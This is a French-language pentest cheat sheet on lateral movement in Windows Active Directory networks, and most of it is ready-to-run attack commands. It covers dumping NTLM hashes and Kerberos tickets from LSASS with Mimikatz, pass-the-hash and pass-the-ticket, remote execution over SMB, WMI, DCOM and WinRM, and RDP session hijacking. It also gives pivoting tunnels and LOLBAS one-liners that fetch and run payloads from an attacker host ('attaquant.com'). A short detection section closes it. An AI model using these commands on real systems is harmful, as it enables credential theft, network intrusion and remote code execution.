---
title: Lateral Movement
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [lateral-movement, active-directory, smb, wmi, rdp, pass-the-hash, sécurité, pentest]
date: 2026-03-22
---

# Lateral Movement

Le mouvement latéral consiste à utiliser les accès obtenus sur une machine pour s'étendre vers d'autres systèmes du réseau, progressant vers des cibles à plus haute valeur (DC, serveurs critiques).

## Pass-the-Hash (PtH)

Utiliser un hash NTLM directement pour s'authentifier sans connaître le mot de passe en clair.

```bash
# Obtenir le hash NTLM depuis LSASS (nécessite admin)
# Mimikatz
sekurlsa::logonpasswords
# → Administrator:500:aad3b435...:8846f7eaee8fb117... → le hash NTLM

# Pass-the-Hash avec Impacket
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.20
impacket-wmiexec -hashes :ntlm_hash domaine/Administrator@192.168.1.20

# CrackMapExec
nxc smb 192.168.1.0/24 -u Administrator -H :ntlm_hash

# Evil-WinRM (WinRM / PowerShell remoting)
evil-winrm -i 192.168.1.20 -u Administrator -H ntlm_hash

# xfreerdp (RDP avec hash — Restricted Admin mode)
xfreerdp /v:192.168.1.20 /u:Administrator /pth:ntlm_hash /d:domaine

# Pourquoi ça marche :
# L'authentification NTLM envoie le hash, pas le mot de passe
# Le serveur compare directement le hash → pas besoin du clair
```

## Pass-the-Ticket (PtT)

Utiliser un ticket Kerberos (TGT ou TGS) volé pour s'authentifier.

```bash
# Extraire les tickets de la mémoire (Mimikatz)
sekurlsa::tickets /export
# ou
kerberos::list /export
# → Fichiers .kirbi dans le répertoire courant

# Injecter un ticket dans la session courante
kerberos::ptt [ticket.kirbi]
# ou
Rubeus.exe ptt /ticket:[ticket.kirbi ou base64]

# Avec Impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domaine.local/alice@SERVER01.domaine.local

# Convertir .kirbi ↔ .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

## Overpass-the-Hash

Utiliser un hash NTLM pour demander un ticket Kerberos TGT (combine PtH et PtT).

```powershell
# Mimikatz
sekurlsa::pth /user:Administrator /domain:domaine.local /ntlm:ntlm_hash /run:powershell.exe
# → Ouvre une session PowerShell avec un TGT Kerberos pour Administrator
# → Plus difficile à détecter que PtH pur

# Rubeus (plus discret — pas d'injection dans LSASS)
Rubeus.exe asktgt /user:Administrator /rc4:ntlm_hash /domain:domaine.local /ptt
# → Demande un TGT et l'injecte dans la session courante
```

## Exécution à distance — protocoles

### PsExec / SMB (port 445)

```bash
# Impacket psexec
impacket-psexec domaine/admin:password@192.168.1.20

# Sysinternals PsExec (Windows)
PsExec.exe \\192.168.1.20 -u Administrator -p password cmd.exe

# Mécanisme :
# 1. Upload d'un service binaire via ADMIN$ share
# 2. Création et démarrage du service
# 3. Shell en SYSTEM
# Très bruyant : événements 7045 (service installé), 4697
```

### WMI (Windows Management Instrumentation — port 135/DCOM)

```bash
# Impacket wmiexec
impacket-wmiexec domaine/admin:password@192.168.1.20

# PowerShell natif
$cred = New-Object System.Management.Automation.PSCredential("domaine\admin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -ComputerName SERVER01 -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"

# Plus discret que psexec (pas de service installé)
# Événements : 4648, connexions DCOM dans le log WMI
```

### WinRM / PowerShell Remoting (port 5985/5986)

```powershell
# PowerShell natif — sessions distantes
$session = New-PSSession -ComputerName SERVER01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { whoami }
Enter-PSSession -Session $session   # Session interactive

# Copier des fichiers via PSRemoting
Copy-Item -Path "C:\tools\mimikatz.exe" -Destination "C:\temp\" -ToSession $session

# Evil-WinRM (meilleur shell interactif)
evil-winrm -i 192.168.1.20 -u admin -p password
evil-winrm -i 192.168.1.20 -u admin -H ntlm_hash
# Fonctionnalités : upload/download, history, invoke scripts, bypass AMSI
```

### DCOM (port 135 + ports dynamiques)

```powershell
# Via MMC Application Object
$dcom = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "192.168.1.20"))
$dcom.Document.ActiveView.ExecuteShellCommand("/c", $null, "cmd /c whoami > C:\out.txt", "7")

# Via ShellBrowserWindow
$dcom = [Activator]::CreateInstance([Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', "192.168.1.20"))
$dcom.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\out.txt", "C:\windows\system32", $null, 0)
```

### RDP (port 3389)

```bash
# Connexion RDP classique
xfreerdp /v:192.168.1.20 /u:admin /p:password /f  # Plein écran

# RDP hijacking — prendre une session d'un autre utilisateur (sans mot de passe, en SYSTEM)
# Trouver les sessions actives
query session /server:SERVER01

# Hijacker une session depuis SYSTEM
tscon <session_id> /dest:<notre_session>
# → La session de l'utilisateur est redirigée vers notre bureau

# RDP via tunnel SSH (si port 3389 filtré)
ssh -L 3389:192.168.1.20:3389 user@pivot.server
xfreerdp /v:127.0.0.1 /u:admin /p:password
```

## Pivoting — traverser des segments réseau

```bash
# SSH tunneling
# Port forwarding local : accéder à un service interne
ssh -L 8080:192.168.2.10:80 user@192.168.1.10
# → localhost:8080 → 192.168.2.10:80 via 192.168.1.10

# Dynamic SOCKS proxy
ssh -D 1080 user@192.168.1.10
proxychains nmap -sT 192.168.2.0/24  # Scan via le proxy

# chisel (pivoting HTTP)
# Serveur (attaquant)
chisel server -p 8888 --reverse

# Client (machine compromise)
chisel client attaquant.com:8888 R:1080:socks
# → SOCKS5 sur attaquant:1080 → tunnelé vers le réseau interne

# Ligolo-ng — pivoting transparent (meilleure alternative à proxychains)
# Agent sur la machine compromise
./agent -connect attaquant.com:11601 -ignore-cert

# Opérateur (attaquant)
./proxy -selfcert
# session → tunnel start → ajouter une route vers le segment interne
```

## Techniques LOLBAS (Living Off The Land)

```powershell
# Exécution via mshta (HTA via URL)
mshta.exe http://attaquant.com/payload.hta

# Via regsvr32 (bypass AppLocker)
regsvr32 /s /n /u /i:http://attaquant.com/payload.sct scrobj.dll

# Via wscript/cscript
cscript //E:jscript payload.js

# Via certutil (download de fichier)
certutil -urlcache -split -f http://attaquant.com/payload.exe C:\temp\payload.exe

# Via bitsadmin
bitsadmin /transfer job http://attaquant.com/payload.exe C:\temp\payload.exe

# Via PowerShell (download + exécution en mémoire)
IEX (New-Object Net.WebClient).DownloadString('http://attaquant.com/payload.ps1')
```

## Détection

```
Événements Windows à surveiller :
  4648 : Connexion avec credentials explicites (runas-like)
  4624 logon type 3 : Connexion réseau (PtH, PsExec)
  4624 logon type 10 : Remote Interactive (RDP)
  7045 : Installation d'un service (PsExec)
  4698/4702 : Création/modification de tâche planifiée

Indicateurs de compromission :
  - Connexions SMB/WMI depuis des postes non-admin vers d'autres postes
  - Utilisation de PsExec depuis une machine non-serveur
  - Sessions WinRM ouvertes depuis des IPs inhabituelles
  - Binaires connus (psexec.exe, wce.exe, mimikatz.exe) sur des hôtes
  - Utilisation de certutil, mshta, regsvr32 avec des URLs

Outils de détection :
  - Sysmon (log des créations de processus, connexions réseau)
  - Windows Defender Credential Guard (protège LSASS)
  - Protected Users Group (désactive NTLM, limite Kerberos)
```
